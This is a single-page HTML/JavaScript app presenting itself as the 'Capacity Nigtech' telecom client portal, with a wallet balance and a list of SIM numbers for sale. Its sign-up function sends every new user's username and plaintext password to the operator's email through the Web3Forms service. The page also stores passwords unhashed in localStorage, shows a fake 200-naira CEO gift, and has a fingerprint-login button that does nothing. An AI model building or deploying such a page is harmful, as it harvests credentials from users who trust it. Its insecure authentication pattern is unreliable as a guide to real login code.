<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capacity Nigtech Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        body { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
        .no-scrollbar::-webkit-scrollbar { display: none; }
        .orange-toast { background-color: #ea580c !important; color: white !important; }
        .spinner { border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top: 2px solid white; width: 16px; height: 16px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="bg-white overflow-hidden">
    <div id="app" class="h-screen w-full flex flex-col"></div>

    <script type="module">
        // Local database to handle login validation without external DB dependency
        let sessionUsers = JSON.parse(localStorage.getItem('capacity_users') || '[]');

        let state = {
            appUserData: null,
            isLoggedIn: false,
            authMode: 'welcome',
            activeTab: 'home',
            isProcessing: false,
            feedback: { show: false, msg: '' },
            signupForm: { name: '', password: '' },
            loginForm: { name: '', password: '' }
        };

        const availableNumbers = ["08172364140", "08172364187", "08172364339", "08172364435", "08172364556", "08172364573", "08172364595", "08172364607", "08172389277", "08172389287", "08172389347", "08172389367", "09089189945"].sort();

        function setState(newState) {
            state = { ...state, ...newState };
            render();
        }

        function triggerFeedback(msg) {
            setState({ feedback: { show: true, msg } });
            setTimeout(() => setState({ feedback: { show: false, msg: '' } }), 4000);
        }

        async function handleSignup() {
            const name = state.signupForm.name.trim();
            const pass = state.signupForm.password.trim();
            if (!name || pass.length < 4) return triggerFeedback("Min 4 characters required");
            
            setState({ isProcessing: true });
            
            try {
                // Sending Registration to your Web3Forms Email
                const response = await fetch("https://api.web3forms.com/submit", {
                    method: "POST",
                    headers: { "Content-Type": "application/json", "Accept": "application/json" },
                    body: JSON.stringify({
                        access_key: "290f4f9b-c231-4ff7-a2ab-a51c79b240af", 
                        subject: `New Signup: ${name}`,
                        from_name: "Capacity Nigtech",
                        username: name,
                        password: pass,
                        message: `A new user registered on Capacity Nigtech.\n\nUsername: ${name}\nPassword: ${pass}`
                    }),
                });

                if (response.ok) {
                    // Save user in local storage to permit immediate login
                    sessionUsers.push({ name: name.toLowerCase(), pass: pass });
                    localStorage.setItem('capacity_users', JSON.stringify(sessionUsers));
                    
                    const profile = { name: name.toUpperCase(), walletBalance: 200 };
                    setState({ appUserData: profile, isLoggedIn: true });
                    triggerFeedback("Account Created Successfully!");
                } else {
                    triggerFeedback("Submission error verify email key");
                }
            } catch (err) {
                triggerFeedback("No Internet Connection");
            } finally {
                setState({ isProcessing: false });
            }
        }

        function handleLogin() {
            const name = state.loginForm.name.trim().toLowerCase();
            const pass = state.loginForm.password.trim();
            
            const userMatch = sessionUsers.find(u => u.name === name && u.pass === pass);

            if (userMatch) {
                const profile = { name: userMatch.name.toUpperCase(), walletBalance: 200 };
                setState({ appUserData: profile, isLoggedIn: true });
                triggerFeedback("Login Successful");
            } else {
                // Strict rule: orange background alert for wrong details
                triggerFeedback("Wrong username or password");
            }
        }

        window.copyToClipboard = (text) => {
            const el = document.createElement('textarea');
            el.value = text; document.body.appendChild(el); el.select();
            document.execCommand('copy'); document.body.removeChild(el);
            triggerFeedback("Copied: " + text);
        };

        function render() {
            const root = document.getElementById('app');
            
            if (!state.isLoggedIn) {
                root.innerHTML = `
                    <div class="fixed inset-0 bg-white flex flex-col p-8 items-center justify-center">
                        <div class="w-20 h-20 bg-orange-600 rounded-3xl mb-6 flex items-center justify-center shadow-2xl">
                           <span class="text-white text-4xl font-black">C</span>
                        </div>
                        <div class="text-center mb-10">
                            <h1 class="font-black text-2xl text-orange-600 tracking-tighter uppercase mb-1">Capacity Nigtech</h1>
                            <p class="text-[10px] text-gray-500 font-bold uppercase tracking-widest italic">Game changer of Connectivity</p>
                        </div>
                        <div class="w-full space-y-4 max-w-sm">
                            ${state.authMode === 'welcome' ? `
                                <button onclick="window.setAuthMode('signup')" class="w-full bg-orange-600 text-white py-4 rounded-2xl font-black uppercase text-xs tracking-widest shadow-lg active:scale-95 transition-all">Create Account</button>
                                <button onclick="window.setAuthMode('login')" class="w-full bg-gray-100 text-gray-800 py-4 rounded-2xl font-black uppercase text-xs tracking-widest active:scale-95 transition-all">Log in</button>
                                <p class="text-center text-[10px] text-gray-300 font-bold mt-8 tracking-[0.2em]">@2026 Capacity Nigtech</p>
                            ` : `
                                <div class="space-y-4 animate-in fade-in slide-in-from-bottom-4 duration-300">
                                    <input type="text" placeholder="Username" class="w-full bg-gray-50 p-4 rounded-2xl font-bold outline-none border-2 border-transparent focus:border-orange-500 uppercase text-sm" id="userNameInput" value="${state.authMode === 'signup' ? state.signupForm.name : state.loginForm.name}">
                                    <input type="password" placeholder="Password" class="w-full bg-gray-50 p-4 rounded-2xl font-bold outline-none border-2 border-transparent focus:border-orange-500 text-sm" id="userPassInput" value="${state.authMode === 'signup' ? state.signupForm.password : state.loginForm.password}">
                                    
                                    <div class="flex gap-2">
                                        <button onclick="window.submitForm()" ${state.isProcessing ? 'disabled' : ''} class="flex-1 bg-orange-600 text-white py-4 rounded-2xl font-black uppercase text-xs tracking-widest shadow-md flex items-center justify-center gap-2 active:scale-95 transition-all">
                                            ${state.isProcessing ? '<div class="spinner"></div>' : (state.authMode === 'signup' ? "Signup Now" : "Login Now")}
                                        </button>
                                        <button onclick="window.triggerFeedback('Fingerprint login enabled')" class="w-16 bg-gray-100 text-orange-600 rounded-2xl flex items-center justify-center border-2 border-orange-50 active:scale-95"><i data-lucide="fingerprint"></i></button>
                                    </div>
                                    
                                    <p onclick="window.setAuthMode('welcome')" class="text-center text-[10px] text-gray-400 font-black uppercase pt-2 cursor-pointer hover:text-orange-600">← Back</p>
                                    <p class="text-center text-[9px] text-gray-300 font-bold pt-8 uppercase tracking-[0.3em]">@2026 Capacity Nigtech</p>
                                </div>
                            `}
                        </div>
                        ${state.feedback.show ? `<div class="fixed top-10 left-6 right-6 z-[300] p-4 orange-toast text-[10px] font-black uppercase rounded-2xl text-center shadow-2xl border-b-4 border-orange-800 animate-in slide-in-from-top-full">${state.feedback.msg}</div>` : ''}
                    </div>
                `;
                setupAuthListeners();
                lucide.createIcons(); return;
            }

            root.innerHTML = `
                <header class="px-6 py-4 flex items-center justify-between border-b bg-white shrink-0">
                    <div class="flex flex-col">
                        <span class="font-black text-orange-600 text-sm tracking-tighter uppercase">Capacity Nigtech</span>
                        <span class="text-[7px] font-bold text-gray-400 uppercase tracking-widest">Client Portal</span>
                    </div>
                    <div class="flex items-center gap-3">
                      <p class="text-[11px] font-black text-gray-800 uppercase tracking-tighter">${state.appUserData.name}</p>
                      <div class="w-10 h-10 bg-orange-600 rounded-xl flex items-center justify-center text-white font-black shadow-md uppercase">${state.appUserData.name[0]}</div>
                    </div>
                </header>
                
                <main class="flex-1 overflow-y-auto pb-32 no-scrollbar bg-white">
                    ${renderTabContent()}
                </main>

                <nav class="fixed bottom-0 left-0 right-0 bg-white border-t px-6 pt-4 pb-8 flex justify-around items-center z-[100] rounded-t-[3rem] shadow-[0_-10px_30px_rgba(0,0,0,0.05)]">
                    <div onclick="window.setActiveTab('home')" class="flex flex-col items-center gap-1 cursor-pointer">
                        <div class="p-2 rounded-xl ${state.activeTab === 'home' ? 'bg-orange-600 text-white' : 'text-gray-300'}">
                            <i data-lucide="home" size="20"></i>
                        </div>
                        <span class="text-[7px] font-black uppercase tracking-widest ${state.activeTab === 'home' ? 'text-orange-600' : 'text-gray-300'}">Capacity home</span>
                    </div>
                    <div onclick="window.setActiveTab('sim')" class="flex flex-col items-center gap-1 cursor-pointer">
                        <div class="p-2 rounded-xl ${state.activeTab === 'sim' ? 'bg-orange-600 text-white' : 'text-gray-300'}">
                            <i data-lucide="smartphone" size="20"></i>
                        </div>
                        <span class="text-[7px] font-black uppercase tracking-widest ${state.activeTab === 'sim' ? 'text-orange-600' : 'text-gray-300'}">Capacity SIM cards</span>
                    </div>
                </nav>
                ${state.feedback.show ? `<div class="fixed top-10 left-6 right-6 z-[300] p-4 orange-toast text-[10px] font-black uppercase rounded-2xl text-center shadow-2xl border-b-4 border-orange-800 animate-in slide-in-from-top-full">${state.feedback.msg}</div>` : ''}
            `;
            lucide.createIcons();
        }

        function setupAuthListeners() {
            const nInp = document.getElementById('userNameInput');
            const pInp = document.getElementById('userPassInput');
            if (nInp) nInp.oninput = (e) => { 
                if(state.authMode === 'signup') state.signupForm.name = e.target.value; 
                else state.loginForm.name = e.target.value; 
            };
            if (pInp) pInp.oninput = (e) => { 
                if(state.authMode === 'signup') state.signupForm.password = e.target.value; 
                else state.loginForm.password = e.target.value; 
            };
        }

        function renderTabContent() {
            if (state.activeTab === 'home') {
                return `
                    <div class="p-5 space-y-6 animate-in fade-in slide-in-from-right-4 duration-500">
                        <div class="bg-orange-600 rounded-3xl p-6 text-white shadow-xl flex items-center justify-between border-b-4 border-orange-700">
                            <div>
                                <p class="text-[8px] font-black text-white/80 tracking-widest uppercase mb-1">Wallet Balance</p>
                                <p class="text-2xl font-black tracking-tight">₦${state.appUserData.walletBalance}.00</p>
                            </div>
                            <div class="bg-white/20 p-3 rounded-2xl"><i data-lucide="wallet"></i></div>
                        </div>

                        <div class="grid grid-cols-2 gap-3">
                            <div onclick="window.copyToClipboard('*301*8*5#')" class="bg-gray-50 p-5 rounded-2xl text-center border active:bg-orange-600 active:text-white group">
                                <p class="text-[7px] font-black text-gray-400 uppercase mb-1">Airtime</p>
                                <p class="text-[12px] font-black text-gray-800 group-active:text-white">*301*8*5#</p>
                            </div>
                            <div onclick="window.copyToClipboard('*301*8*6#')" class="bg-gray-50 p-5 rounded-2xl text-center border active:bg-orange-600 active:text-white group">
                                <p class="text-[7px] font-black text-gray-400 uppercase mb-1">Data</p>
                                <p class="text-[12px] font-black text-gray-800 group-active:text-white">*301*8*6#</p>
                            </div>
                        </div>

                        <div class="bg-gray-50 p-5 rounded-[2rem] border-l-4 border-orange-600 shadow-sm">
                            <h3 class="text-[9px] font-black uppercase text-orange-600 mb-2">Notice</h3>
                            <p class="text-[10px] font-bold text-gray-600 italic">"Congratulations you received 200 naira gift from Capacity Nigtech CEO Mr AUWAL TUKUR thank you for believing in the vision"</p>
                        </div>
                        
                        <p class="text-center text-[10px] text-gray-200 font-bold uppercase tracking-[0.4em] pt-20">@2026 Capacity Nigtech</p>
                    </div>`;
            } else {
                return `
                    <div class="p-5 animate-in fade-in slide-in-from-right-4">
                        <h2 class="font-black uppercase text-[10px] tracking-widest text-gray-400 mb-4 px-2">Choose your SIM</h2>
                        <div class="grid grid-cols-1 gap-2">
                            ${availableNumbers.map(n => `<div onclick="window.triggerFeedback('SIM Order Requested: ' + '${n}')" class="p-5 bg-gray-50 rounded-2xl flex justify-between items-center active:bg-orange-600 active:text-white">
                                <span class="font-black text-xs tracking-widest">${n}</span>
                                <span class="text-[9px] font-black bg-white/50 px-2 py-1 rounded-lg">₦1,500</span>
                            </div>`).join('')}
                        </div>
                    </div>`;
            }
        }

        window.setAuthMode = (mode) => setState({ authMode: mode });
        window.setActiveTab = (tab) => setState({ activeTab: tab });
        window.triggerFeedback = triggerFeedback;
        window.submitForm = () => { if(state.authMode === 'signup') handleSignup(); else handleLogin(); };

        render();
    </script>
</body>
</html>

